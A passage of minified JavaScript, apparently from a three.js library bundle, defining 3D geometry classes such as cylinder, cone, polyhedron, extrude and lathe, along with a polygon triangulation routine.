u=ne(c);t=void 0!==t?t:1,n=void 0!==n?n:1,r=r||1,i=Math.floor(i)||8,a=Math.floor(a)||1,o=void 0!==o&&o,s=void 0!==s?s:0,l=void 0!==l?l:2*Math.PI;var d=[],p=[],h=[],f=[],A=0,m=[],v=r/2,g=0;function y(e){for(var r=A,a=new ie,o=new he,c=0,m=!0===e?t:n,y=!0===e?1:-1,b=1;b<=i;b++)p.push(0,v*y,0),h.push(0,y,0),f.push(.5,.5),A++;for(var _=A,w=0;w<=i;w++){var C=w/i*l+s,x=Math.cos(C),S=Math.sin(C);o.x=m*S,o.y=v*y,o.z=m*x,p.push(o.x,o.y,o.z),h.push(0,y,0),a.x=.5*x+.5,a.y=.5*S*y+.5,f.push(a.x,a.y),A++}for(var k=0;k<i;k++){var M=r+k,B=_+k;!0===e?d.push(B,B+1,M):d.push(B+1,B,M),c+=3}u.addGroup(g,c,!0===e?1:2),g+=c}return function(){for(var e=new he,o=new he,c=0,y=(n-t)/r,b=0;b<=a;b++){for(var _=[],w=b/a,C=w*(n-t)+t,x=0;x<=i;x++){var S=x/i,k=S*l+s,M=Math.sin(k),B=Math.cos(k);o.x=C*M,o.y=-w*r+v,o.z=C*B,p.push(o.x,o.y,o.z),e.set(M,y,B).normalize(),h.push(e.x,e.y,e.z),f.push(S,1-w),_.push(A++)}m.push(_)}for(var E=0;E<i;E++)for(var T=0;T<a;T++){var P=m[T][E],I=m[T+1][E],F=m[T+1][E+1],L=m[T][E+1];d.push(P,I,L),d.push(I,F,L),c+=6}u.addGroup(g,c,0),g+=c}(),!1===o&&(0<t&&y(!0),0<n&&y(!1)),c.setIndex(d),c.setAttribute("position",new qt(p,3)),c.setAttribute("normal",new qt(h,3)),c.setAttribute("uv",new qt(f,2)),c}return te(t,e),t}(sn),po=function(e){function t(t,n,r,i,a,o,s,l){var c;return(c=e.call(this)||this).type="CylinderGeometry",c.parameters={radiusTop:t,radiusBottom:n,height:r,radialSegments:i,heightSegments:a,openEnded:o,thetaStart:s,thetaLength:l},c.fromBufferGeometry(new uo(t,n,r,i,a,o,s,l)),c.mergeVertices(),c}return te(t,e),t}(oo),ho=function(e){function t(t,n,r,i,a,o,s){var l;return(l=e.call(this,0,t,n,r,i,a,o,s)||this).type="ConeGeometry",l.parameters={radius:t,height:n,radialSegments:r,heightSegments:i,openEnded:a,thetaStart:o,thetaLength:s},l}return te(t,e),t}(po),fo=function(e){function t(t,n,r,i,a,o,s){var l;return(l=e.call(this,0,t,n,r,i,a,o,s)||this).type="ConeBufferGeometry",l.parameters={radius:t,height:n,radialSegments:r,heightSegments:i,openEnded:a,thetaStart:o,thetaLength:s},l}return te(t,e),t}(uo),Ao=function(e){function t(t,n,r,i){var a;(a=e.call(this)||this).type="PolyhedronBufferGeometry",a.parameters={vertices:t,indices:n,radius:r,detail:i},r=r||1;var o=[],s=[];function l(e,t,n,r){for(var i=r+1,a=[],o=0;o<=i;o++){a[o]=[];for(var s=e.clone().lerp(n,o/i),l=t.clone().lerp(n,o/i),u=i-o,d=0;d<=u;d++)a[o][d]=0===d&&o===i?s:s.clone().lerp(l,d/u)}for(var p=0;p<i;p++)for(var h=0;h<2*(i-p)-1;h++){var f=Math.floor(h/2);h%2==0?(c(a[p][f+1]),c(a[p+1][f]),c(a[p][f])):(c(a[p][f+1]),c(a[p+1][f+1]),c(a[p+1][f]))}}function c(e){o.push(e.x,e.y,e.z)}function u(e,n){var r=3*e;n.x=t[r+0],n.y=t[r+1],n.z=t[r+2]}function d(e,t,n,r){r<0&&1===e.x&&(s[t]=e.x-1),0===n.x&&0===n.z&&(s[t]=r/2/Math.PI+.5)}function p(e){return Math.atan2(e.z,-e.x)}return function(e){for(var t=new he,r=new he,i=new he,a=0;a<n.length;a+=3)u(n[a+0],t),u(n[a+1],r),u(n[a+2],i),l(t,r,i,e)}(i=i||0),function(e){for(var t=new he,n=0;n<o.length;n+=3)t.x=o[n+0],t.y=o[n+1],t.z=o[n+2],t.normalize().multiplyScalar(e),o[n+0]=t.x,o[n+1]=t.y,o[n+2]=t.z}(r),function(){for(var e=new he,t=0;t<o.length;t+=3){e.x=o[t+0],e.y=o[t+1],e.z=o[t+2];var n=p(e)/2/Math.PI+.5,r=(i=e,Math.atan2(-i.y,Math.sqrt(i.x*i.x+i.z*i.z))/Math.PI+.5);s.push(n,1-r)}var i;(function(){for(var e=new he,t=new he,n=new he,r=new he,i=new ie,a=new ie,l=new ie,c=0,u=0;c<o.length;c+=9,u+=6){e.set(o[c+0],o[c+1],o[c+2]),t.set(o[c+3],o[c+4],o[c+5]),n.set(o[c+6],o[c+7],o[c+8]),i.set(s[u+0],s[u+1]),a.set(s[u+2],s[u+3]),l.set(s[u+4],s[u+5]),r.copy(e).add(t).add(n).divideScalar(3);var h=p(r);d(i,u+0,e,h),d(a,u+2,t,h),d(l,u+4,n,h)}})(),function(){for(var e=0;e<s.length;e+=6){var t=s[e+0],n=s[e+2],r=s[e+4],i=Math.max(t,n,r),a=Math.min(t,n,r);.9<i&&a<.1&&(t<.2&&(s[e+0]+=1),n<.2&&(s[e+2]+=1),r<.2&&(s[e+4]+=1))}}()}(),a.setAttribute("position",new qt(o,3)),a.setAttribute("normal",new qt(o.slice(),3)),a.setAttribute("uv",new qt(s,2)),0===i?a.computeVertexNormals():a.normalizeNormals(),a}return te(t,e),t}(sn),mo=function(e){function t(t,n){var r,i=(1+Math.sqrt(5))/2,a=1/i,o=[-1,-1,-1,-1,-1,1,-1,1,-1,-1,1,1,1,-1,-1,1,-1,1,1,1,-1,1,1,1,0,-a,-i,0,-a,i,0,a,-i,0,a,i,-a,-i,0,-a,i,0,a,-i,0,a,i,0,-i,0,-a,i,0,-a,-i,0,a,i,0,a];return(r=e.call(this,o,[3,11,7,3,7,15,3,15,13,7,19,17,7,17,6,7,6,15,17,4,8,17,8,10,17,10,6,8,0,16,8,16,2,8,2,10,0,12,1,0,1,18,0,18,16,6,10,2,6,2,13,6,13,15,2,16,18,2,18,3,2,3,13,18,1,9,18,9,11,18,11,3,4,14,12,4,12,0,4,0,8,11,9,5,11,5,19,11,19,7,19,5,14,19,14,4,19,4,17,1,12,14,1,14,5,1,5,9],t,n)||this).type="DodecahedronBufferGeometry",r.parameters={radius:t,detail:n},r}return te(t,e),t}(Ao),vo=function(e){function t(t,n){var r;return(r=e.call(this)||this).type="DodecahedronGeometry",r.parameters={radius:t,detail:n},r.fromBufferGeometry(new mo(t,n)),r.mergeVertices(),r}return te(t,e),t}(oo),go=new he,yo=new he,bo=new he,_o=new Mt,wo=function(e){function t(t,n){var r;(r=e.call(this)||this).type="EdgesGeometry",r.parameters={thresholdAngle:n},n=void 0!==n?n:1,t.isGeometry&&(t=(new sn).fromGeometry(t));for(var i=Math.pow(10,4),a=Math.cos(J.DEG2RAD*n),o=t.getIndex(),s=t.getAttribute("position"),l=o?o.count:s.count,c=[0,0,0],u=["a","b","c"],d=new Array(3),p={},h=[],f=0;f<l;f+=3){c[2]=o?(c[0]=o.getX(f),c[1]=o.getX(f+1),o.getX(f+2)):(c[0]=f,c[1]=f+1,f+2);var A=_o.a,m=_o.b,v=_o.c;if(A.fromBufferAttribute(s,c[0]),m.fromBufferAttribute(s,c[1]),v.fromBufferAttribute(s,c[2]),_o.getNormal(bo),d[0]=Math.round(A.x*i)+","+Math.round(A.y*i)+","+Math.round(A.z*i),d[1]=Math.round(m.x*i)+","+Math.round(m.y*i)+","+Math.round(m.z*i),d[2]=Math.round(v.x*i)+","+Math.round(v.y*i)+","+Math.round(v.z*i),d[0]!==d[1]&&d[1]!==d[2]&&d[2]!==d[0])for(var g=0;g<3;g++){var y=(g+1)%3,b=d[g],_=d[y],w=_o[u[g]],C=_o[u[y]],x=b+"_"+_,S=_+"_"+b;S in p&&p[S]?(bo.dot(p[S].normal)<=a&&(h.push(w.x,w.y,w.z),h.push(C.x,C.y,C.z)),p[S]=null):x in p||(p[x]={index0:c[g],index1:c[y],normal:bo.clone()})}}for(var k in p)if(p[k]){var M=p[k],B=M.index0,E=M.index1;go.fromBufferAttribute(s,B),yo.fromBufferAttribute(s,E),h.push(go.x,go.y,go.z),h.push(yo.x,yo.y,yo.z)}return r.setAttribute("position",new qt(h,3)),r}return te(t,e),t}(sn);function Co(e,t,n,r,i){var a,o;if(i===0<function(e,t,n,r){for(var i=0,a=t,o=n-r;a<n;a+=r)i+=(e[o]-e[a])*(e[a+1]+e[o+1]),o=a;return i}(e,t,n,r))for(a=t;a<n;a+=r)o=zo(a,e[a],e[a+1],o);else for(a=n-r;t<=a;a-=r)o=zo(a,e[a],e[a+1],o);return o&&No(o,o.next)&&(Ho(o),o=o.next),o}function xo(e,t){if(!e)return e;t||(t=e);var n,r=e;do{if(n=!1,r.steiner||!No(r,r.next)&&0!==Oo(r.prev,r,r.next))r=r.next;else{if(Ho(r),(r=t=r.prev)===r.next)break;n=!0}}while(n||r!==t);return t}function So(e,t,n,r,i,a,o){if(e){!o&&a&&function(e,t,n,r){for(var i=e;null===i.z&&(i.z=Io(i.x,i.y,t,n,r)),i.prevZ=i.prev,i.nextZ=i.next,(i=i.next)!==e;);i.prevZ.nextZ=null,i.prevZ=null,function(e){var t,n,r,i,a,o,s,l,c=1;do{for(n=e,a=e=null,o=0;n;){for(o++,r=n,t=s=0;t<c&&(s++,r=r.nextZ);t++);for(l=c;0<s||0<l&&r;)0!==s&&(0===l||!r||n.z<=r.z)?(n=(i=n).nextZ,s--):(r=(i=r).nextZ,l--),a?a.nextZ=i:e=i,i.prevZ=a,a=i;n=r}a.nextZ=null,c*=2}while(1<o)}(i)}(e,r,i,a);for(var s,l,c=e;e.prev!==e.next;)if(s=e.prev,l=e.next,a?Mo(e,r,i,a):ko(e))t.push(s.i/n),t.push(e.i/n),t.push(l.i/n),Ho(e),e=l.next,c=l.next;else if((e=l)===c){o?1===o?So(e=Bo(xo(e),t,n),t,n,r,i,a,2):2===o&&Eo(e,t,n,r,i,a):So(xo(e),t,n,r,i,a,1);break}}}function ko(e){var t=e.prev,n=e,r=e.next;if(0<=Oo(t,n,r))return!1;for(var i=e.next.next;i!==e.prev;){if(Lo(t.x,t.y,n.x,n.y,r.x,r.y,i.x,i.y)&&0<=Oo(i.prev,i,i.next))return!1;i=i.next}return!0}function Mo(e,t,n,r){var i=e.prev,a=e,o=e.next;if(0<=Oo(i,a,o))return!1;for(var s=i.x<a.x?i.x<o.x?i.x:o.x:a.x<o.x?a.x:o.x,l=i.y<a.y?i.y<o.y?i.y:o.y:a.y<o.y?a.y:o.y,c=i.x>a.x?i.x>o.x?i.x:o.x:a.x>o.x?a.x:o.x,u=i.y>a.y?i.y>o.y?i.y:o.y:a.y>o.y?a.y:o.y,d=Io(s,l,t,n,r),p=Io(c,u,t,n,r),h=e.prevZ,f=e.nextZ;h&&h.z>=d&&f&&f.z<=p;){if(h!==e.prev&&h!==e.next&&Lo(i.x,i.y,a.x,a.y,o.x,o.y,h.x,h.y)&&0<=Oo(h.prev,h,h.next))return!1;if(h=h.prevZ,f!==e.prev&&f!==e.next&&Lo(i.x,i.y,a.x,a.y,o.x,o.y,f.x,f.y)&&0<=Oo(f.prev,f,f.next))return!1;f=f.nextZ}for(;h&&h.z>=d;){if(h!==e.prev&&h!==e.next&&Lo(i.x,i.y,a.x,a.y,o.x,o.y,h.x,h.y)&&0<=Oo(h.prev,h,h.next))return!1;h=h.prevZ}for(;f&&f.z<=p;){if(f!==e.prev&&f!==e.next&&Lo(i.x,i.y,a.x,a.y,o.x,o.y,f.x,f.y)&&0<=Oo(f.prev,f,f.next))return!1;f=f.nextZ}return!0}function Bo(e,t,n){var r=e;do{var i=r.prev,a=r.next.next;!No(i,a)&&Do(i,r,r.next,a)&&Uo(i,a)&&Uo(a,i)&&(t.push(i.i/n),t.push(r.i/n),t.push(a.i/n),Ho(r),Ho(r.next),r=e=a),r=r.next}while(r!==e);return xo(r)}function Eo(e,t,n,r,i,a){var o,s,l=e;do{for(var c=l.next.next;c!==l.prev;){if(l.i!==c.i&&(s=c,(o=l).next.i!==s.i&&o.prev.i!==s.i&&!function(e,t){var n=e;do{if(n.i!==e.i&&n.next.i!==e.i&&n.i!==t.i&&n.next.i!==t.i&&Do(n,n.next,e,t))return!0;n=n.next}while(n!==e);return!1}(o,s)&&(Uo(o,s)&&Uo(s,o)&&function(e,t){for(var n=e,r=!1,i=(e.x+t.x)/2,a=(e.y+t.y)/2;n.y>a!=n.next.y>a&&n.next.y!==n.y&&i<(n.next.x-n.x)*(a-n.y)/(n.next.y-n.y)+n.x&&(r=!r),(n=n.next)!==e;);return r}(o,s)&&(Oo(o.prev,o,s.prev)||Oo(o,s.prev,s))||No(o,s)&&0<Oo(o.prev,o,o.next)&&0<Oo(s.prev,s,s.next)))){var u=$o(l,c);return l=xo(l,l.next),u=xo(u,u.next),So(l,t,n,r,i,a),void So(u,t,n,r,i,a)}c=c.next}l=l.next}while(l!==e)}function To(e,t){return e.x-t.x}function Po(e,t){if(t=function(e,t){var n,r=t,i=e.x,a=e.y,o=-1/0;do{if(a<=r.y&&a>=r.next.y&&r.next.y!==r.y){var s=r.x+(a-r.y)*(r.next.x-r.x)/(r.next.y-r.y);if(s<=i&&o<s){if((o=s)===i){if(a===r.y)return r;if(a===r.next.y)return r.next}n=r.x<r.next.x?r:r.next}}r=r.next}while(r!==t);if(!n)return null;if(i===o)return n;var l,c,u,d=n,p=n.x,h=n.y,f=1/0;for(r=n;i>=r.x&&r.x>=p&&i!==r.x&&Lo(a<h?i:o,a,p,h,a<h?o:i,a,r.x,r.y)&&(l=Math.abs(a-r.y)/(i-r.x),Uo(r,e)&&(l<f||l===f&&(r.x>n.x||r.x===n.x&&(u=r,Oo((c=n).prev,c,u.prev)<0&&Oo(u.next,c,c.next)<0)))&&(n=r,f=l)),(r=r.next)!==d;);return n}(e,t)){var n=$o(t,e);xo(t,t.next),xo(n,n.next)}}function Io(e,t,n,r,i){return(e=1431655765&((e=858993459&((e=252645135&((e=16711935&((e=32767*(e-n)*i)|e<<8))|e<<4))|e<<2))|e<<1))|(t=1431655765&((t=858993459&((t=252645135&((t=16711935&((t=32767*(t-r)*i)|t<<8))|t<<4))|t<<2))|t<<1))<<1}function Fo(e){for(var t=e,n=e;(t.x<n.x||t.x===n.x&&t.y<n.y)&&(n=t),(t=t.next)!==e;);return n}function Lo(e,t,n,r,i,a,o,s){return 0<=(i-o)*(t-s)-(e-o)*(a-s)&&0<=(e-o)*(r-s)-(n-o)*(t-s)&&0<=(n-o)*(a-s)-(i-o)*(r-s)}function Oo(e,t,n){return(t.y-e.y)*(n.x-t.x)-(t.x-e.x)*(n.y-t.y)}function No(e,t){return e.x===t.x&&e.y===t.y}function Do(e,t,n,r){var i=jo(Oo(e,t,n)),a=jo(Oo(e,t,r)),o=jo(Oo(n,r,e)),s=jo(Oo(n,r,t));return i!==a&&o!==s||!(0!==i||!Ro(e,n,t))||!(0!==a||!Ro(e,r,t))||!(0!==o||!Ro(n,e,r))||!(0!==s||!Ro(n,t,r))}function Ro(e,t,n){return t.x<=Math.max(e.x,n.x)&&t.x>=Math.min(e.x,n.x)&&t.y<=Math.max(e.y,n.y)&&t.y>=Math.min(e.y,n.y)}function jo(e){return 0<e?1:e<0?-1:0}function Uo(e,t){return Oo(e.prev,e,e.next)<0?0<=Oo(e,t,e.next)&&0<=Oo(e,e.prev,t):Oo(e,t,e.prev)<0||Oo(e,e.next,t)<0}function $o(e,t){var n=new Vo(e.i,e.x,e.y),r=new Vo(t.i,t.x,t.y),i=e.next,a=t.prev;return(e.next=t).prev=e,(n.next=i).prev=n,(r.next=n).prev=r,(a.next=r).prev=a,r}function zo(e,t,n,r){var i=new Vo(e,t,n);return r?(i.next=r.next,(i.prev=r).next.prev=i,r.next=i):(i.prev=i).next=i,i}function Ho(e){e.next.prev=e.prev,e.prev.next=e.next,e.prevZ&&(e.prevZ.nextZ=e.nextZ),e.nextZ&&(e.nextZ.prevZ=e.prevZ)}function Vo(e,t,n){this.i=e,this.x=t,this.y=n,this.prev=null,this.next=null,this.z=null,this.prevZ=null,this.nextZ=null,this.steiner=!1}var Qo={area:function(e){for(var t=e.length,n=0,r=t-1,i=0;i<t;r=i++)n+=e[r].x*e[i].y-e[i].x*e[r].y;return.5*n},isClockWise:function(e){return Qo.area(e)<0},triangulateShape:function(e,t){var n=[],r=[],i=[];Go(e),Wo(n,e);var a=e.length;t.forEach(Go);for(var o=0;o<t.length;o++)r.push(a),a+=t[o].length,Wo(n,t[o]);for(var s=function(e,t,n){n=n||2;var r,i,a,o,s,l,c,u=t&&t.length,d=u?t[0]*n:e.length,p=Co(e,0,d,n,!0),h=[];if(!p||p.next===p.prev)return h;if(u&&(p=function(e,t,n,r){var i,a,o,s=[];for(i=0,a=t.length;i<a;i++)(o=Co(e,t[i]*r,i<a-1?t[i+1]*r:e.length,r,!1))===o.next&&(o.steiner=!0),s.push(Fo(o));for(s.sort(To),i=0;i<s.length;i++)Po(s[i],n),n=xo(n,n.next);return n}(e,t,p,n)),e.length>80*n){r=a=e[0],i=o=e[1];for(var f=n;f<d;f+=n)(s=e[f])<r&&(r=s),(l=e[f+1])<i&&(i=l),a<s&&(a=s),o<l&&(o=l);c=0!==(c=Math.max(a-r,o-i))?1/c:0}return So(p,h,n,r,i,c),h}(n,r),l=0;l<s.length;l+=3)i.push(s.slice(l,l+3));return i}};function Go(e){var t=e.length;2<t&&e[t-1].equals(e[0])&&e.pop()}function Wo(e,t){for(var n=0;n<t.length;n++)e.push(t[n].x),e.push(t[n].y)}var Ko=function(e){function t(t,n){var r;(r=e.call(this)||this).type="ExtrudeBufferGeometry",r.parameters={shapes:t,options:n},t=Array.isArray(t)?t:[t];for(var i=ne(r),a=[],o=[],s=0,l=t.length;s<l;s++)c(t[s]);function c(e){var t=[],r=void 0!==n.curveSegments?n.curveSegments:12,s=void 0!==n.steps?n.steps:1,l=void 0!==n.depth?n.depth:100,c=void 0===n.bevelEnabled||n.bevelEnabled,u=void 0!==n.bevelThickness?n.bevelThickness:6,d=void 0!==n.bevelSize?n.bevelSize:u-2,p=void 0!==n.bevelOffset?n.bevelOffset:0,h=void 0!==n.bevelSegments?n.bevelSegments:3,f=n.extrudePath,A=void 0!==n.UVGenerator?n.UVGenerator:qo;void 0!==n.amount&&(l=n.amount);var m,v,g,y,b,_=!1;f&&(m=f.getSpacedPoints(s),c=!(_=!0),v=f.computeFrenetFrames(s,!1),g=new he,y=new he,b=new he),c||(p=d=u=h=0);var w=e.extractPoints(r),C=w.shape,x=w.holes;if(!Qo.isClockWise(C)){C=C.reverse();for(var S=0,k=x.length;S<k;S++){var M=x[S];Qo.isClockWise(M)&&(x[S]=M.reverse())}}for(var B=Qo.triangulateShape(C,x),E=C,T=0,P=x.length;T<P;T++){var I=x[T];C=C.concat(I)}function F(e,t,n){return t.clone().multiplyScalar(n).add(e)}var L=C.length,O=B.length;function N(e,t,n){var r,i,a,o=e.x-t.x,s=e.y-t.y,l=n.x-e.x,c=n.y-e.y,u=o*o+s*s,d=o*c-s*l;if(Math.abs(d)>Number.EPSILON){var p=Math.sqrt(u),h=Math.sqrt(l*l+c*c),f=t.x-s/p,A=t.y+o/p,m=((n.x-c/h-f)*c-(n.y+l/h-A)*l)/(o*c-s*l),v=(r=f+o*m-e.x)*r+(i=A+s*m-e.y)*i;if(v<=2)return new ie(r,i);a=Math.sqrt(v/2)}else{var g=!1;o>Number.EPSILON?l>Number.EPSILON&&(g=!0):o<-Number.EPSILON?l<-Number.EPSILON&&(g=!0):Math.sign(s)===Math.sign(c)&&(g=!0),a=g?(r=-s,i=o,Math.sqrt(u)):(r=o,i=s,Math.sqrt(u/2))}return new ie(r/a,i/a)}for(var D=[],R=0,j=E.length,U=j-1,$=R+1;R<j;R++,U++,$++)U===j&&(U=0),$===j&&($=0),D[R]=N(E[R],E[U],E[$]);for(var z,H=[],V=D.concat(),Q=0,G=x.length;Q<G;Q++){var W=x[Q];z=[];for(var K=0,q=W.length,X=q-1,Y=K+1;K<q;K++,X++,Y++)X===q&&(X=0),Y===q&&(Y=0),z[K]=N(W[K],W[X],W[Y]);H.push(z),V=V.concat(z)}for(var J=0;J<h;J++){for(var Z=J/h,ee=u*Math.cos(Z*Math.PI/2),te=d*Math.sin(Z*Math.PI/2)+p,ne=0,re=E.length;ne<re;ne++){var ae=F(E[ne],D[ne],te);Fe(ae.x,ae.y,-ee)}for(var oe=0,se=x.length;oe<se;oe++){var le=x[oe];z=H[oe];for(var ce=0,ue=le.length;ce<ue;ce++){var de=F(le[ce],z[ce],te);Fe(de.x,de.y,-ee)}}}for(var pe=d+p,fe=0;fe<L;fe++){var Ae=c?F(C[fe],V[fe],pe):C[fe];_?(y.copy(v.normals[0]).multiplyScalar(Ae.x),g.copy(v.binormals[0]).multiplyScalar(Ae.y),b.copy(m[0]).add(y).add(g),Fe(b.x,b.y,b.z)):Fe(Ae.x,Ae.y,0)}for(var me=1;me<=s;me++)for(var ve=0;ve<L;ve++){var ge=c?F(C[ve],V[ve],pe):C[ve];_?(y.copy(v.normals[me]).multiplyScalar(ge.x),g.copy(v.binormals[me]).multiplyScalar(ge.y),b.copy(m[me]).add(y).add(g),Fe(b.x,b.y,b.z)):Fe(ge.x,ge.y,l/s*me)}for(var ye=h-1;0<=ye;ye--){for(var be=ye/h,_e=u*Math.cos(be*Math.PI/2),we=d*Math.sin(be*Math.PI/2)+p,Ce=0,xe=E.length;Ce<xe;Ce++){var Se=F(E[Ce],D[Ce],we);Fe(Se.x,Se.y,l+_e)}for(var ke=0,Me=x.length;ke<Me;ke++){var Be=x[ke];z=H[ke];for(var Ee=0,Te=Be.length;Ee<Te;Ee++){var Pe=F(Be[Ee],z[Ee],we);_?Fe(Pe.x,Pe.y+m[s-1].y,m[s-1].x+_e):Fe(Pe.x,Pe.y,l+_e)}}}function Ie(e,t){for(var n=e.length;0<=--n;){var r=n,i=n-1;i<0&&(i=e.length-1);for(var a=0,o=s+2*h;a<o;a++){var l=L*a,c=L*(a+1);Oe(t+r+l,t+i+l,t+i+c,t+r+c)}}}function Fe(e,n,r){t.push(e),t.push(n),t.push(r)}function Le(e,t,n){Ne(e),Ne(t),Ne(n);var r=a.length/3,o=A.generateTopUV(i,a,r-3,r-2,r-1);De(o[0]),De(o[1]),De(o[2])}function Oe(e,t,n,r){Ne(e),Ne(t),Ne(r),Ne(t),Ne(n),Ne(r);var o=a.length/3,s=A.generateSideWallUV(i,a,o-6,o-3,o-2,o-1);De(s[0]),De(s[1]),De(s[3]),De(s[1]),De(s[2]),De(s[3])}function Ne(e){a.push(t[3*e+0]),a.push(t[3*e+1]),a.push(t[3*e+2])}function De(e){o.push(e.x),o.push(e.y)}!function(){var e=a.length/3;if(c){for(var t=0,n=L*t,r=0;r<O;r++){var o=B[r];Le(o[2]+n,o[1]+n,o[0]+n)}n=L*(t=s+2*h);for(var l=0;l<O;l++){var u=B[l];Le(u[0]+n,u[1]+n,u[2]+n)}}else{for(var d=0;d<O;d++){var p=B[d];Le(p[2],p[1],p[0])}for(var f=0;f<O;f++){var A=B[f];Le(A[0]+L*s,A[1]+L*s,A[2]+L*s)}}i.addGroup(e,a.length/3-e,0)}(),function(){var e=a.length/3,t=0;Ie(E,t),t+=E.length;for(var n=0,r=x.length;n<r;n++){var o=x[n];Ie(o,t),t+=o.length}i.addGroup(e,a.length/3-e,1)}()}return r.setAttribute("position",new qt(a,3)),r.setAttribute("uv",new qt(o,2)),r.computeVertexNormals(),r}return te(t,e),t.prototype.toJSON=function(){var e=sn.prototype.toJSON.call(this);return function(e,t,n){if(n.shapes=[],Array.isArray(e))for(var r=0,i=e.length;r<i;r++){var a=e[r];n.shapes.push(a.uuid)}else n.shapes.push(e.uuid);return void 0!==t.extrudePath&&(n.options.extrudePath=t.extrudePath.toJSON()),n}(this.parameters.shapes,this.parameters.options,e)},t}(sn),qo={generateTopUV:function(e,t,n,r,i){var a=t[3*n],o=t[3*n+1],s=t[3*r],l=t[3*r+1],c=t[3*i],u=t[3*i+1];return[new ie(a,o),new ie(s,l),new ie(c,u)]},generateSideWallUV:function(e,t,n,r,i,a){var o=t[3*n],s=t[3*n+1],l=t[3*n+2],c=t[3*r],u=t[3*r+1],d=t[3*r+2],p=t[3*i],h=t[3*i+1],f=t[3*i+2],A=t[3*a],m=t[3*a+1],v=t[3*a+2];return Math.abs(s-u)<.01?[new ie(o,1-l),new ie(c,1-d),new ie(p,1-f),new ie(A,1-v)]:[new ie(s,1-l),new ie(u,1-d),new ie(h,1-f),new ie(m,1-v)]}},Xo=function(e){function t(t,n){var r;return(r=e.call(this)||this).type="ExtrudeGeometry",r.parameters={shapes:t,options:n},r.fromBufferGeometry(new Ko(t,n)),r.mergeVertices(),r}return te(t,e),t.prototype.toJSON=function(){var t=e.prototype.toJSON.call(this);return function(e,t,n){if(n.shapes=[],Array.isArray(e))for(var r=0,i=e.length;r<i;r++){var a=e[r];n.shapes.push(a.uuid)}else n.shapes.push(e.uuid);return void 0!==t.extrudePath&&(n.options.extrudePath=t.extrudePath.toJSON()),n}(this.parameters.shapes,this.parameters.options,t)},t}(oo),Yo=function(e){function t(t,n){var r,i=(1+Math.sqrt(5))/2,a=[-1,i,0,1,i,0,-1,-i,0,1,-i,0,0,-1,i,0,1,i,0,-1,-i,0,1,-i,i,0,-1,i,0,1,-i,0,-1,-i,0,1];return(r=e.call(this,a,[0,11,5,0,5,1,0,1,7,0,7,10,0,10,11,1,5,9,5,11,4,11,10,2,10,7,6,7,1,8,3,9,4,3,4,2,3,2,6,3,6,8,3,8,9,4,9,5,2,4,11,6,2,10,8,6,7,9,8,1],t,n)||this).type="IcosahedronBufferGeometry",r.parameters={radius:t,detail:n},r}return te(t,e),t}(Ao),Jo=function(e){function t(t,n){var r;return(r=e.call(this)||this).type="IcosahedronGeometry",r.parameters={radius:t,detail:n},r.fromBufferGeometry(new Yo(t,n)),r.mergeVertices(),r}return te(t,e),t}(oo),Zo=function(e){function t(t,n,r,i){var a;(a=e.call(this)||this).type="LatheBufferGeometry",a.parameters={points:t,segments:n,phiStart:r,phiLength:i},n=Math.floor(n)||12,r=r||0,i=i||2*Math.PI,i=J.clamp(i,0,2*Math.PI);for(var o=[],s=[],l=[],c=1/n,u=new he,d=new ie,p=0;p<=n;p++)for(var h=r+p*c*i,f=Math.sin(h),A=Math.cos(h),m=0;m<=t.length-1;m++)u.x=t[m].x*f,u.y=t[m].y,u.z=t[m].x*A,s.push(u.x,u.y,u.z),d.x=p/n,d.y=m/(t.length-1),l.push(d.x,d.y);for(var v=0;v<n;v++)for(var g=0;g<t.length-1;g++){var y=g+v*t.length,b=y,_=y+t.length,w=y+t.length+1,C=y+1;o.push(b,_,C),o.push(_,w,C)}if(a.setIndex(o),a.setAttribute("position",new qt(s,3)),a.setAttribute("uv",new qt(l,2)),a.computeVertexNormals(),i===2*Math.PI)for(var x=a.attributes.normal.array,S=new he,k=new he,M=new he,B=n*t.length*3,E=0,T=0;E<t.length;E++,T+=3)S.x=x[T+0],S.y=x[T+1],S.z=x[T+2],k.x=x[B+T+0],k.y=x[B+T+1],k.z=x[B+T+2],M.addVectors(S,k).normalize(),x[T+0]=x[B+T+0]=M.x,x[T+1]=x[B+T+1]=M.y,x[T+2]=x[B+T+2]=M.z;return a}return te(t,e),t}(sn),es=function(e){function t(t,n,r,i){var a;return(a=e.call(this)||this).type="LatheGeometry",a.parameters={points:t,segments:n,phiStart:r,phiLength:i},a.fromBufferGeometry(new Zo(t,n,r,i)),a.mergeVertices(),a}return te(t,e),t}(oo),ts=function(e){function t(t,n){var r;return(r=e.call(this,[1,0,0,-1,0,0,0,1,0,0,-1,0,0,0,1,0,0,-1],[0,2,4,0,4,3,0,3,5,0,5,2,1,2,5,1,5,3,1,3,4,1,4,2],t,n)||this).type="OctahedronBufferGeometry",r.parameters={radius:t,detail:n},r}return te(t,e),t}(Ao),ns=function(e){function t(t,n){var r;return(r=e.call(this)||this).type="OctahedronGeometry",r.parameters={radius:t,detail:n},r.fromBufferGeometry(new ts(t,n)),r.mergeVertices(),r}return te(t,e),t}(oo);function rs(e,t,n){sn.call(this),this.type="ParametricBufferGeometry",this.parameters={func:e,slices:t,stacks:n};var r=[],i=[],a=[],o=[],s=new he,l=new he,c=new he,u=new he,d=new he;e.length;for(var p=t+1,h=0;h<=n;h++)for(var f=h/n,A=0;A<=t;A++){var m=A/t;e(m,f,l),i.push(l.x,l.y,l.z),0<=m-1e-5?(e(m-1e-5,f,c),u.subVectors(l,c)):(e(m+1e-5,f,c),u.subVectors(c,l)),0<=f-1e-5?(e(m,f-1e-5,c),d.subVectors(l,c)):(e(m,f+1e-5,c),d.subVectors(c,l)),s.crossVectors(u,d).normalize(),a.push(s.x,s.y,s.z),o.push(m,f)}for(var v=0;v<n;v++)for(var g=0;g<t;g++){var y=v*p+g,b=v*p+g+1,_=(v+1)*p+g+1,w=(v+1)*p+g;r.push(y,b,w),r.push(b,_,w)}this.setIndex(r),this.setAttribute("position",new qt(i,3)),this.setAttribute("normal",new qt(a,3)),this.setAttribute("uv",new qt(o,2))}function is(e,t,n){oo.call(this),this.type="ParametricGeometry",this.parameters={func:e,slices:t,stacks:n},this.fromBufferGeometry(new rs(e,t,n)),this.mergeVertices()}(rs.prototype=Object.create(sn.prototype)).constructor=rs,(is.prototype=Object.create(oo.prototype)).constructor=is;var as=function(e){function t(t,n,r,i){var a;return(a=e.call(this)||this).type="PlaneGeometry",a.parameters={width:t,height:n,widthSegments:r,heightSegments:i},a.fromBufferGeometry(new Vn(t,n,r,i)),a.mergeVertices(),a}return te(t,e),t}(oo),os=function(e){function t(t,n,r,i){var 